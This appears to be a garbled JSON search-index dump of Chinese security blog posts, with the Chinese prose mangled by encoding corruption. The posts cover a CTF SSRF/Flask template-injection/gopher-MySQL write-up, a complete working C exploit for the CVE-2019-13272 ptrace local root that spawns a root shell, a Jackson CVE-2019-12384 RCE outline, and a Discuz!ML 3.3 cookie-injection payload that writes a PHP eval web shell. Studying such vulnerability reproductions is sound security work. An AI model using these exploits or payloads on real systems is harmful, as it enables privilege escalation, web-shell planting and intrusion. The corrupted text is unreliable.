¹æ®parse_urlè§£æå’Œcurlè§£æçš„ä¸åŒå¯¼è‡´è¿˜æœ‰å¦å¤–ä¸€ç§payloadï¼Œä¸å†™äº†ï¼Œå¤Ÿç”¨å°±å¥½~è¦ä¸è¿˜å¾—å†™åŸç†-.-! å¾—åˆ°å†…ç½‘ç½‘æ®µ Alert 3 è¿›è¡Œå†…ç½‘æ¢æµ‹ æœ‰å†…ç½‘ç½‘æ®µï¼Œå½“ç„¶ä¸‹ä¸€æ­¥æ˜¯è¿›è¡Œå¯¹ç½‘æ®µæ‰«æï¼Œå¾—åˆ°ä»–çš„å­˜æ´»IPå’Œå¼€æ”¾ç«¯å£ é€‰æ‹©Cluster bombæ¨¡å¼ï¼Œæ·»åŠ å‚æ•°ï¼Œå­—å…¸çš„è¯æˆ‘ä¹Ÿæ‰“åŒ…åœ¨æ–‡ç« æœ«å°¾ ps:ç”±äºæœåŠ¡å™¨é—®é¢˜ï¼Œè¿™ä¸ªçœŸå®è·‘çš„æ—¶å€™å¾ˆæ…¢ï¼Œæƒ³å˜å¿«å¯ä»¥æŠŠç«¯å£åªè®¾ç½®æˆ3306ï¼Œ8080ï¼Œä¸è¿‡æˆ‘æœ‰æ—¶é—´ï¼Œè®©ä»–è·‘å‘—ï¼Œåšå°±åšä¸ªå…¨å¥—çš„ æœ€ç»ˆå¾—åˆ°2ä¸ªIP:portï¼š172.11.243.81:8080å’Œ172.11.243.218:3306 åˆ†åˆ«å›æ˜¾ #172.11.243.81:8080 5.7.25-0ubuntu0.16.04.2/\u0006,mysql_native_password\u001b\u0001ï¿½ï¿½\u0004Got packets out of order #172.11.243.218:3306 import flask import os app = flask.Flask(__name__) app.config['HINT'] = os.environ.pop('HINT') @app.route('/') def index(): return open(__file__).read() @app.route('/yulige/&lt;path:yulige&gt;') def yulige(yulige): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s return flask.render_template_string(safe_jinja(yulige)) if __name__ == '__main__': app.run(&quot;0.0.0.0&quot;,port=8080) å‡ºç°äº†ä»£ç ï¼Œé‚£ä¹ˆå»æœä¸€ä¸‹ï¼Œç™¾åº¦æœç´¢ flask ctf è¿›å»çœ‹çœ‹è¿™ä¸ªflask pythonæ¡†æ¶æœ‰ä»€ä¹ˆcxkæ“ä½œ ç¨€é‡Œç³Šæ¶‚çš„çœ‹çœ‹ï¼Œå¾—å‡ºæ„é€ payloadä¸º payload: ï¼Ÿurl=http://172.11.243.81:8080/yulige/{{url_for.__globals__[%27current_app%27].config[%27HINT%27]}} //æ‚„æ‚„è¯´ä¸€å¥ï¼šéƒç¦»æ­Œæˆ‘ä¹Ÿæƒ³è¦å¤©çœ¼ Alert 4 é€šè¿‡SSRF+gopherå¾—åˆ°flag ç›®å‰å·²ç»å¾—åˆ°æ•°æ®åº“åyuligeeee123321 ï¼Œé‚£ä¹ˆå¼€å§‹çš„æ­£åˆ™é‡Œæœ‰ç€gopheråè®®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é gopheråè®®å¯¹mysqlè¿›è¡Œæ”»å‡»ã€‚ mysqlæ²¡è®¾ç½®å¯†ç çš„è¯æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ssrf+gopherå¾—åˆ°æ•°æ®åº“é‡Œé¢çš„å†…å®¹çš„ï¼Œä¸‹æ¬¡é‡åˆ°ç±»ä¼¼çš„èƒ½æƒ³èµ·æ¥è¿˜æœ‰è¿™ä¹ˆä¸ªæ“ä½œå°±å¥½ ç¥­å‡ºä¸€ä¸ªè„šæœ¬Gopherusï¼Œè¿™ä¸ªå±äºSSRFé…åˆgopheråè®®çš„åˆ©ç”¨å·¥å…·ï¼Œæ–‡å°¾å·²æ‰“åŒ… python2ç¼–å†™çš„ï¼šhttps://github.com/tarunkant/Gopherus è„šæœ¬è¿è¡Œæˆªå›¾ payloadï¼šå¤ªé•¿äº†ï¼Œè‡ªå·±ç”¨è„šæœ¬è·‘ä¸€ä¸‹å§ï¼Œæ¯æ¬¡å¾—åˆ°çš„payloadè¦ç»§ç»­ç”¨urlç¼–ç å†æ¬¡ç¼–ç ï¼Œå› ä¸ºä»–æ˜¯SSRFï¼Œæ˜¯å­˜åœ¨è·³æ¿æœºçš„ï¼Œè·³æ¿æœºä¼šå…ˆè§£ä¸€æ¬¡ç  show database â€”å¾—åˆ°æ•°æ®åº“ï¼Œinformation_schema fla4441111g select group_concat(table_name) from information_schema.tables where table_schema='fla4441111g' â€”å¾—åˆ°è¡¨åï¼Œ F1111llllggggg select group_concat(column_name) from information_schema.columns where table_schema='fla4441111g' and table_name='F1111llllggggg' â€”å¾—åˆ°å­—æ®µï¼Œ flag select flag from fla4441111g.F1111llllggggg â€”å¾—åˆ°flagï¼Œ flag{QAQ_YLG_NO1} æ–‡ä¸­ç”¨åˆ°çš„é™„ä»¶é›†åˆï¼š http://129.28.179.23/upload/å…¥ç¾¤é¢˜.zip ","link":"https://www.svenbeast.com/post/KQ6xR86Hl/"},{"title":"Linuxæ¡Œé¢ç‰ˆæœ¬åœ°ææƒ(CVE-2019-13272æ¼æ´å¤ç°)","content":"0x01 å‰è¨€ 2019å¹´7æœˆ29æ—¥ï¼Œç½‘ä¸Šå‡ºç°çš„CVE-2019-13272ï¼ˆLinuxæœ¬åœ°ææƒæ¼æ´ï¼‰çš„åˆ©ç”¨è„šæœ¬ï¼Œä¸‹ç­åæœ‰æ—¶é—´å°±å¤ç°ä¸€ä¸‹ 0x02 ç¯å¢ƒ ç¯å¢ƒå‡†å¤‡:18.04.1 Ubuntu Desktopç‰ˆæœ¬ Linux ubuntu 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux POC: // Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) // Uses pkexec technique // --- // Original discovery and exploit author: Jann Horn // - https://bugs.chromium.org/p/project-zero/issues/detail?id=1903 // --- // &lt;bcoles@gmail.com&gt; // - added known helper paths // - added search for suitable helpers // - added automatic targeting // - changed target suid exectuable from passwd to pkexec // https://github.com/bcoles/kernel-exploits/tree/master/CVE-2019-13272 // --- // Tested on: // - Ubuntu 16.04.5 kernel 4.15.0-29-generic // - Ubuntu 18.04.1 kernel 4.15.0-20-generic // - Ubuntu 19.04 kernel 5.0.0-15-generic // - Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic // - Linux Mint 19 kernel 4.15.0-20-generic // - Xubuntu 16.04.4 kernel 4.13.0-36-generic // - ElementaryOS 0.4.1 4.8.0-52-generic // - Backbox 6 kernel 4.18.0-21-generic // - Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64 // - Kali kernel 4.19.0-kali5-amd64 // - Redcore 1806 (LXQT) kernel 4.16.16-redcore // - MX 18.3 kernel 4.19.37-2~mx17+1 // - RHEL 8.0 kernel 4.18.0-80.el8.x86_64 // - Debian 9.4.0 kernel 4.9.0-6-amd64 // - Debian 10.0.0 kernel 4.19.0-5-amd64 // - Devuan 2.0.0 kernel 4.9.0-6-amd64 // - SparkyLinux 5.8 kernel 4.19.0-5-amd64 // - Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64 // - Manjaro 18.0.3 kernel 4.19.23-1-MANJARO // - Mageia 6 kernel 4.9.35-desktop-1.mga6 // - Antergos 18.7 kernel 4.17.6-1-ARCH // --- // user@linux-mint-19-2:~$ gcc -s poc.c -o ptrace_traceme_root // user@linux-mint-19-2:~$ ./ptrace_traceme_root // Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272) // [.] Checking environment ... // [~] Done, looks good // [.] Searching for known helpers ... // [~] Found known helper: /usr/sbin/mate-power-backlight-helper // [.] Using helper: /usr/sbin/mate-power-backlight-helper // [.] Spawning suid process (/usr/bin/pkexec) ... // [.] Tracing midpid ... // [~] Attached to midpid // To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;. // See &quot;man sudo_root&quot; for details. // // root@linux-mint-19-2:/home/user# // --- #define _GNU_SOURCE #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;signal.h&gt; #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt; #include &lt;sched.h&gt; #include &lt;stddef.h&gt; #include &lt;stdarg.h&gt; #include &lt;pwd.h&gt; #include &lt;sys/prctl.h&gt; #include &lt;sys/wait.h&gt; #include &lt;sys/ptrace.h&gt; #include &lt;sys/user.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/stat.h&gt; #include &lt;linux/elf.h&gt; #define DEBUG #ifdef DEBUG # define dprintf printf #else # define dprintf #endif #define SAFE(expr) ({ \\ typeof(expr) __res = (expr); \\ if (__res == -1) { \\ dprintf(&quot;[-] Error: %s\\n&quot;, #expr); \\ return 0; \\ } \\ __res; \\ }) #define max(a,b) ((a)&gt;(b) ? (a) : (b)) static const char *SHELL = &quot;/bin/bash&quot;; static int middle_success = 1; static int block_pipe[2]; static int self_fd = -1; static int dummy_status; static const char *helper_path; static const char *pkexec_path = &quot;/usr/bin/pkexec&quot;; static const char *pkaction_path = &quot;/usr/bin/pkaction&quot;; struct stat st; const char *helpers[1024]; const char *known_helpers[] = { &quot;/usr/lib/gnome-settings-daemon/gsd-backlight-helper&quot;, &quot;/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper&quot;, &quot;/usr/lib/unity-settings-daemon/usd-backlight-helper&quot;, &quot;/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper&quot;, &quot;/usr/sbin/mate-power-backlight-helper&quot;, &quot;/usr/bin/xfpm-power-backlight-helper&quot;, &quot;/usr/bin/lxqt-backlight_backend&quot;, &quot;/usr/libexec/gsd-wacom-led-helper&quot;, &quot;/usr/libexec/gsd-wacom-oled-helper&quot;, &quot;/usr/libexec/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-backlight-helper&quot;, &quot;/usr/lib/gsd-wacom-led-helper&quot;, &quot;/usr/lib/gsd-wacom-oled-helper&quot;, }; /* temporary printf; returned pointer is valid until next tprintf */ static char *tprintf(char *fmt, ...) { static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf; } /* * fork, execute pkexec in parent, force parent to trace our child process, * execute suid executable (pkexec) in child. */ static int middle_main(void *dummy) { prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(&quot;/proc/self/exe&quot;, O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(&quot;/proc/%d/status&quot;, middle), O_RDONLY)); char *needle = tprintf(&quot;\\nUid:\\t%d\\t0\\t&quot;, getuid()); while (1) { char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = '\\0'; if (strstr(buf, needle)) break; } /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec's creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute a suid executable (pkexec). * Because the ptrace relationship is considered to be privileged, * this is a proper suid execution despite the attached tracer, * not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ execl(pkexec_path, basename(pkexec_path), NULL); dprintf(&quot;[-] execl: Executing suid executable failed&quot;); exit(EXIT_FAILURE); } SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); /* execute pkexec as current user */ struct passwd *pw = getpwuid(getuid()); if (pw == NULL) { dprintf(&quot;[-] getpwuid: Failed to retrieve username&quot;); exit(EXIT_FAILURE); } middle_success = 1; execl(pkexec_path, basename(pkexec_path), &quot;--user&quot;, pw-&gt;pw_name, helper_path, &quot;--help&quot;, NULL); middle_success = 0; dprintf(&quot;[-] execl: Executing pkexec failed&quot;); exit(EXIT_FAILURE); } /* ptrace pid and wait for signal */ static int force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) { struct user_regs_struct regs; struct iovec iov = { .iov_base = &amp;regs, .iov_len = sizeof(regs) }; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &amp;iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) &amp; ~0xfffUL; struct injected_page { unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; } ipage = { .argv = { scratch_area + offsetof(struct injected_page, arg0) } }; strcpy(ipage.arg0, arg0); for (int i = 0; i &lt; sizeof(ipage)/sizeof(long); i++) { unsigned long pdata = ((unsigned long *)&amp;ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); } /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &amp;iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, &amp;dummy_status, 0)); } static int middle_stage2(void) { /* our child is hanging in signal delivery from execve()'s SIGTRAP */ pid_t child = SAFE(waitpid(-1, &amp;dummy_status, 0)); force_exec_and_wait(child, 42, &quot;stage3&quot;); return 0; } // * * * * * * * * * * * * * * * * root shell * * * * * * * * * * * * * * * * * static int spawn_shell(void) { SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(SHELL, basename(SHELL), NULL); dprintf(&quot;[-] execlp: Executing shell %s failed&quot;, SHELL); exit(EXIT_FAILURE); } // * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * * * static int check_env(void) { const char* xdg_session = getenv(&quot;XDG_SESSION_ID&quot;); dprintf(&quot;[.] Checking environment ...\\n&quot;); if (stat(pkexec_path, &amp;st) != 0) { dprintf(&quot;[-] Could not find pkexec executable at %s&quot;, pkexec_path); exit(EXIT_FAILURE); } if (stat(pkaction_path, &amp;st) != 0) { dprintf(&quot;[-] Could not find pkaction executable at %s&quot;, pkaction_path); exit(EXIT_FAILURE); } if (xdg_session == NULL) { dprintf(&quot;[!] Warning: $XDG_SESSION_ID is not set\\n&quot;); return 1; } if (system(&quot;/bin/loginctl --no-ask-password show-session $XDG_SESSION_ID | /bin/grep Remote=no &gt;&gt;/dev/null 2&gt;&gt;/dev/null&quot;) != 0) { dprintf(&quot;[!] Warning: Could not find active PolKit agent\\n&quot;); return 1; } if (stat(&quot;/usr/sbin/getsebool&quot;, &amp;st) == 0) { if (system(&quot;/usr/sbin/getsebool deny_ptrace 2&gt;1 | /bin/grep -q on&quot;) == 0) { dprintf(&quot;[!] Warning: SELinux deny_ptrace is enabled\\n&quot;); return 1; } } dprintf(&quot;[~] Done, looks good\\n&quot;); return 0; } /* * Use pkaction to search PolKit policy actions for viable helper executables. * Check each action for allow_active=yes, extract the associated helper path, * and check the helper path exists. */ int find_helpers() { char cmd[1024]; snprintf(cmd, sizeof(cmd), &quot;%s --verbose&quot;, pkaction_path); FILE *fp; fp = popen(cmd, &quot;r&quot;); if (fp == NULL) { dprintf(&quot;[-] Failed to run: %s\\n&quot;, cmd); exit(EXIT_FAILURE); } char line[1024]; char buffer[2048]; int helper_index = 0; int useful_action = 0; static const char *needle = &quot;org.freedesktop.policykit.exec.path -&gt; &quot;; int needle_length = strlen(needle); while (fgets(line, sizeof(line)-1, fp) != NULL) { /* check the action uses allow_active=yes*/ if (strstr(line, &quot;implicit active:&quot;)) { if (strstr(line, &quot;yes&quot;)) { useful_action = 1; } continue; } if (useful_action == 0) continue; useful_action = 0; /* extract the helper path */ int length = strlen(line); char* found = memmem(&amp;line[0], length, needle, needle_length); if (found == NULL) continue; memset(buffer, 0, sizeof(buffer)); for (int i = 0; found[needle_length + i] != '\\n'; i++) { if (i &gt;= sizeof(buffer)-1) continue; buffer[i] = found[needle_length + i]; } if (strstr(&amp;buffer[0], &quot;/xf86-video-intel-backlight-helper&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cpugovctl&quot;) != 0 || strstr(&amp;buffer[0], &quot;/package-system-locked&quot;) != 0 || strstr(&amp;buffer[0], &quot;/cddistupgrader&quot;) != 0) { dprintf(&quot;[.] Ignoring blacklisted helper: %s\\n&quot;, &amp;buffer[0]); continue; } /* check the path exists */ if (stat(&amp;buffer[0], &amp;st) != 0) continue; helpers[helper_index] = strndup(&amp;buffer[0], strlen(buffer)); helper_index++; if (helper_index &gt;= sizeof(helpers)/sizeof(helpers[0])) break; } pclose(fp); return 0; } // * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * int ptrace_traceme_root() { dprintf(&quot;[.] Using helper: %s\\n&quot;, helper_path); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], &amp;dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ dprintf(&quot;[.] Spawning suid process (%s) ...\\n&quot;, pkexec_path); static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) { int fd = open(tprintf(&quot;/proc/%d/comm&quot;, midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = '\\0'; *strchrnul(buf, '\\n') = '\\0'; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); } /* * our child should have gone through both the privileged execve() and the * following execve() here */ dprintf(&quot;[.] Tracing midpid ...\\n&quot;); SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, &amp;dummy_status, 0)); dprintf(&quot;[~] Attached to midpid\\n&quot;); force_exec_and_wait(midpid, 0, &quot;stage2&quot;); exit(EXIT_SUCCESS); } int main(int argc, char **argv) { if (strcmp(argv[0], &quot;stage2&quot;) == 0) return middle_stage2(); if (strcmp(argv[0], &quot;stage3&quot;) == 0) return spawn_shell(); dprintf(&quot;Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\\n&quot;); check_env(); if (argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;check&quot;) == 0) { exit(0); } /* Search for known helpers defined in 'known_helpers' array */ dprintf(&quot;[.] Searching for known helpers ...\\n&quot;); for (int i=0; i&lt;sizeof(known_helpers)/sizeof(known_helpers[0]); i++) { if (stat(known_helpers[i], &amp;st) == 0) { helper_path = known_helpers[i]; dprintf(&quot;[~] Found known helper: %s\\n&quot;, helper_path); ptrace_traceme_root(); } } /* Search polkit policies for helper executables */ dprintf(&quot;[.] Searching for useful helpers ...\\n&quot;); find_helpers(); for (int i=0; i&lt;sizeof(helpers)/sizeof(helpers[0]); i++) { if (helpers[i] == NULL) break; if (stat(helpers[i], &amp;st) == 0) { helper_path = helpers[i]; ptrace_traceme_root(); } } return 0; } 0x03 å¤ç° ä¿è¯ubuntuæœ‰gccå“¦ usage:gcc poc.c ./a.out ææƒæˆåŠŸ è¯¥æ¼æ´åˆ©ç”¨ç®€å•ï¼Œå½±å“èŒƒå›´å¹¿,éœ€æ³¨æ„çš„æ˜¯åªå¯¹Desktopæœ‰æ•ˆï¼Œserverä¸å¯ä»¥å“¦ï¼Œè¿™æ–¹é¢ç•¥æ˜¾é¸¡è‚‹ 0x04 ä¿®å¤ æ¼æ´ä¿®å¤è¡¥ä¸ï¼š https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee ","link":"https://www.svenbeast.com/post/U4oArG5HS/"},{"title":"FasterXML Jacksonè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆå¤ç°CVE-2019-12384ï¼‰","content":"1.é¦–å…ˆæ‰“å¼€httpæœåŠ¡ï¼Œè¿™é‡Œç”¨çš„æ˜¯python3è‡ªå¸¦çš„ï¼Œå…¶ä»–çš„ä¹Ÿå¯ï¼Œåªè¦å¯ä»¥è®¿é—®åˆ° ps:pythonè‡ªå¸¦çš„è¿™ä¸ªæœåŠ¡ä»å“ªä¸ªæ–‡ä»¶å¤¹æ‰“å¼€ï¼Œæ­¤æ–‡ä»¶å¤¹ä¸ºé»˜è®¤æ ¹ç›®å½• 2.é…ç½®jrubyï¼Œè¿™é‡Œå› ä¸ºæˆ‘ä¹‹å‰é…ç½®è¿‡ï¼Œæ‰€ä»¥å·²å­˜åœ¨ï¼Œå¹¶æ— å½±å“ï¼Œjrubyå·²æ‰“åŒ… ps:ln -s ~/jruby-9.2.7.0/bin/jruby /usr/local/bin/ 3.è¿è¡Œtest.rb,è¿›è¡Œå‘½ä»¤æ‰§è¡Œ 4.è¿™é‡Œçš„inject.sqlï¼Œä¸ºå†™å‘½ä»¤çš„æ–‡ä»¶ï¼Œæ­¤æ–‡ä»¶æ”¾åœ¨httpæœåŠ¡çš„æ ¹ç›®å½•é‡Œï¼Œjacksonè¦èƒ½è¿œç¨‹è·å–åˆ° 5.åœ¨å®Œæˆç¬¬ä¸‰æ­¥çš„æ—¶å€™ï¼Œå·²ç»å‘½ä»¤æ‰§è¡Œå®Œæˆï¼Œåœ¨httpæœåŠ¡çš„æ ¹ç›®å½•ä¼šç”Ÿæˆexploited.txtæ–‡ä»¶ï¼Œé‡Œé¢æ˜¯å‘½ä»¤æ‰§è¡Œåå¾—åˆ°çš„å›æ˜¾ PSï¼šè§£å‹å¯†ç :svenbeast é“¾æ¥: https://pan.baidu.com/s/1yhdmOz3QQ7Nm_Ar6m4-dWg æå–ç : avpe ","link":"https://www.svenbeast.com/post/fasterxml-jackson-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2019-12384/"},{"title":"Discuz!ml3.3æ¼æ´å¤ç°åŠåˆ†æ(é™„POC)","content":"s1. èƒŒæ™¯ åœ¨7æœˆ11æ—¥Discuzå¤šè¯­è¨€ç‰ˆæ›å‡ºå­˜åœ¨RCEæ¼æ´ï¼Œæ‰€ä»¥å®˜æ–¹ä¸‹è½½æºç å¯¹æ¼æ´è¿›è¡Œå¤ç°å’Œåˆ†æ ä¸‹è½½åœ°å€:https://discuz.ml/download æœ¬äººä¸‹çš„æ˜¯3.3ç‰ˆæœ¬ï¼Œä¸å¾—ä¸åæ§½ä¸€ä¸‹ï¼Œä¸‹è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ‰€ä»¥æˆ‘åŒæ—¶ä¸‹è½½çš„ï¼Œæœ€å…ˆå®Œæˆçš„æ˜¯3.3æŒ‰æœ¬ï¼Œä¹Ÿå°±ç”¨äº†ã€‚ s2. å®‰è£… æœ¬äººç¯å¢ƒï¼šphp5.6+Nginxï¼ˆwindowsæ¨èä½¿ç”¨phpstudyï¼‰ ä¸‹è½½æºç åï¼Œè§£å‹è‡³å®‰è£…ç›®å½•åè®¿é—®:127.0.0.1/discuz!ml3.3/upload,è¿›å…¥æ­¤ç›®æ ‡å°†å¼€å§‹å®‰è£… å› ä¸ºæœ¬äººå·²ç»å®‰è£…å¥½ï¼Œå°±ä¸åœ¨æ»šé”®ç›˜äº†ï¼Œç›´æ¥ä¸‹ä¸€æ­¥å³å¯ï¼Œæœ€åå†™ä¸Šæœ¬æœºçš„æ•°æ®åº“è¿æ¥å¯†ç ï¼Œåœ¨è®¾ç½®ç®¡ç†å‘˜è´¦å·å¯†ç å³å¯ ps:å®‰è£…åæ— å›¾ç‰‡æ˜¾ç¤ºï¼Œè«æ…Œï¼Œä¸å½±å“ä½¿ç”¨ s3. ä»£ç æ‰§è¡Œ æ¼æ´åœ¨äºcookieçš„è¯­è¨€å¯æ§å¹¶ä¸”æ²¡æœ‰ä¸¥æ ¼è¿‡æ»¤ï¼Œæ³¨å…¥åå¯¼è‡´å¯ä»¥è¿œç¨‹ä»£ç æ‰§è¡Œ è®¿é—®127.0.0.1/discuz!ml3.3/upload/home.phpï¼Œè®¿é—®åˆ«çš„phpæ–‡ä»¶ä¹Ÿå¯ä»¥ï¼Œcookieå­—æ®µä¸­ä¼šå‡ºç°xxxx_xxxx_languageå­—æ®µï¼Œæ ¹æœ¬åŸå› å°±æ˜¯è¿™ä¸ªå­—æ®µå­˜åœ¨æ³¨å…¥ï¼Œå¯¼è‡´çš„RCE æŠ“åŒ…æ‰¾åˆ°cookieçš„languageçš„å€¼ä¿®æ”¹ä¸ºxxxx_xxxx_language=sc'.phpinfo().'ï¼ŒæˆåŠŸæ‰§è¡Œï¼Œè¿™é‡Œçš„scå¯ä»¥ä¸å¸¦ æ„é€ ä¸€å¥è¯,è¿æ¥èšå‰‘ payloadï¼š%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27 å®é™…ä¸ºï¼š'.+file_put_contents('shell.php',urldecode('<?php eval($_POST[\"1\"]);?>')).' å¯çœ‹åˆ°è·¯å¾„ä¸‹ç”Ÿæˆshell.phpï¼Œè¿æ¥å¯†ç ä¸º1 æ£€æµ‹è„šæœ¬ï¼šhttps://github.com/theLSA/discuz-ml-rce å€Ÿç”¨æ­¤ä½œè€…çš„è„šæœ¬ï¼Œå†™çš„éå¸¸å…¨ï¼Œæ–¹ä¾¿æ£€æµ‹å’ŒéªŒè¯ s4. åˆ†æ åœ¨discuz!ml3.3\\upload\\source\\module\\portalçš„portal_index.phpé‡Œå­˜åœ¨ç€åŒ…å« è·Ÿè¸ªtemplate åœ¨discuz!ml3.3\\upload\\source\\functionçš„function_core.phpæ–‡ä»¶ä¸­ ä»–çš„è¿”å›å€¼ä¸ºDISCUZ_ROOT.cachefileï¼Œè€Œcachefileï¼Œè€Œcachefileï¼Œè€Œcachefileåœ¨ä¸Šé¢ä¹Ÿæœ‰ï¼Œå¯çœ‹å‡ºç”±å„å˜é‡æ¥è¿›è¡Œç»„æˆçš„ï¼Œå…¶ä¸­çš„DISCUZ_LANGä¸ºå¯æ§åˆ¶å˜é‡ discuz!ml3.3\\upload\\source\\class\\discuzä¸‹çš„discuz_application.phpæ–‡ä»¶ â†‘ å¯çœ‹å‡ºè¿™é‡Œç›´æ¥å°†å€¼ä¼ å…¥åˆ°lngå˜é‡ï¼Œç»§ç»­è·Ÿè¸ª â†‘ $lngç›´æ¥èµ‹ç»™DISCUZ_LANGï¼Œæ‰€ä»¥DISCUZ_LANGå¸¸é‡ä¸ºå¯æ§ å› æ­¤payloadé€šè¿‡ä¿®æ”¹cookieé‡Œçš„languageå­—æ®µå†…å®¹ä¼ å…¥ï¼Œç›®å‰å·²ç»æ§åˆ¶äº†æ–‡ä»¶åå­—ï¼Œè€ŒDiscuzä¼šå°†æˆ‘ä»¬å†™å…¥çš„å­˜å…¥ç¼“å­˜ï¼ŒçœŸæ­£åŒ…å«çš„æ˜¯ç¼“å­˜æ–‡ä»¶ å†™å…¥çš„ç¼“å­˜æ–‡ä»¶å­˜åœ¨discuz!ml3.3\\upload\\data\\template â†‘ debugçš„æ—¶å€™å†™å…¥çš„ç¼“å­˜æ–‡ä»¶ â†‘ checktplrefresh()å‡½æ•°ä¸­å°†cachefileä¼ å…¥parsetemplate(),ç„¶åæ‹¼æ¥ç»™cachefileä¼ å…¥parse_template(),ç„¶åæ‹¼æ¥ç»™cachefileä¼ å…¥parsetâ€‹emplate(),ç„¶åæ‹¼æ¥ç»™headeraddï¼Œæ¥ç€æ‹¼æ¥ç»™$template â†‘ æœ€åå°†$templateå†™å…¥åˆ°ç¼“å­˜æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´çš„é‚£ä¸ªç›®å½•ä¸‹ ç»ˆäºè¢«includeåŒ…å«æ‰§è¡Œ æ€»ç»“ï¼šlanguageå¯æ§ï¼Œä¼ ç»™languageå¯æ§ï¼Œä¼ ç»™languageå¯æ§ï¼Œä¼ ç»™templateï¼Œç”Ÿæˆç¼“å­˜æ–‡ä»¶åï¼Œåˆè¢«include_onceåŒ…å«ï¼Œé€ æˆRCE s5. ä¿®å¤ è‡³æ–‡ç« ç¼–è¾‘æ—¥2019å¹´7æœˆ16æ—¥å¹¶æ— å®˜æ–¹è¡¥ä¸ å…³æ³¨ï¼šhttps://bitbucket.org/vot/discuz.ml/commits/allç­‰å¾…è¡¥ä¸ PSï¼šå› åšå®¢é‡å»ºï¼Œç‰¹æ„å°†æœ¬äººæ–‡ç« ä»Toolsè½¬ç§»å›æ¥ï¼Œå¦‚æœ‰å½±å“ï¼Œå¯è”ç³»åˆ å¸– æ–‡ç« é“¾æ¥ï¼ˆæ¥ç‚¹ä¸ªé¡¶å¯å¥½~ï¼‰ï¼šhttps://www.t00ls.net/thread-51968-1-1.html 